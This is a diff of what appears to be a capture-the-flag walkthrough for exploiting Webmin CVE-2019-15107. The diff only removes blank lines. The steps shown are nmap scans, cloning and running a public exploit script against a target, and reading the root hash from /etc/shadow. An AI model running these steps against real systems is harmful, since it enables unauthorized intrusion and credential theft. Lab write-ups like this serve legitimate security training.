@@ -166,10 +166,7 @@ We start with a port scan on the first 15000 ports.
 
 
 ``` bash
-
 nmap -p 1-15000 -sV -oN initial_scan.txt <TARGET_IP>
-
-
 
 ```
 
@@ -184,7 +181,6 @@ Once we know which ports are open, we perform a deeper scan:
 
 
 ``` bash
-
 nmap -p <OPEN_PORTS_COMMA_SEPARATED> -sV -sC -O -oN service_scan.txt <TARGET_IP>
 
 ```
@@ -331,8 +327,6 @@ Clone the repository:
 
 git clone https://github.com/MuirlandOracle/CVE-2019-15107
 
-
-
 ```
 
 
@@ -343,11 +337,7 @@ Go to the folder:
 
 ``` bash
 
-
-
 cd CVE-2019-15107
-
-
 
 ```
 
@@ -359,11 +349,7 @@ Install required Python libraries:
 
 ``` bash
 
-
-
 pip3 install -r requirements.txt
-
-
 
 ```
 
@@ -374,10 +360,7 @@ pip3 install -r requirements.txt
 
 
 ``` bash
-
 sudo apt install python3-pip
-
-
 
 ```
 
@@ -415,8 +398,6 @@ Make script executable (if needed):
 
 chmod +x ./CVE-2019-15107.py
 
-
-
 ```
 
 ## 2️⃣ Understand the Script
@@ -441,10 +422,7 @@ Verify the script executes commands as intended.
 
 ``` bash
 
-
-
 ./CVE-2019-15107.py TARGET_IP
-
 
 ```
 
@@ -510,11 +488,7 @@ Root password hash:
 
 ``` bash
 
-
-
 cat /etc/shadow | grep root
-
-
 
 ```
 
